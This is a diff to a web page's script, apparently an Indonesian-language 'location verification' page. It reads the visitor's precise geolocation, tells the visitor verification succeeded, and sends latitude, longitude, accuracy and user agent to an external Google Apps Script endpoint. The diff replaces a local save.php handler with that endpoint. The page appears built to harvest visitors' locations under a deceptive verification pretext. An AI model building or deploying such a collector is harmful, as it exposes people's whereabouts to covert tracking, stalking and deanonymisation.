@@ -83,23 +83,23 @@
 </div>
 
 <script>
+const ENDPOINT = "https://script.google.com/macros/s/AKfycbyzY8GG093h42QqYPRXOotlxRo__rdd_ECq27NrxdKSm5TQzHyKCNRJ4l5lWfxXSiO8/exec";
+
 if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(
     function (position) {
       const data = {
         latitude: position.coords.latitude,
         longitude: position.coords.longitude,
-        accuracy: position.coords.accuracy
+        accuracy: position.coords.accuracy,
+        userAgent: navigator.userAgent
       };
 
       document.getElementById("status").innerText =
         "Verifikasi lokasi berhasil.";
 
-      fetch("save.php", {
+      fetch(ENDPOINT, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
         body: JSON.stringify(data)
       });
     },
@@ -110,6 +110,7 @@ if (navigator.geolocation) {
   );
 }
 </script>
+
 
 
 </body>
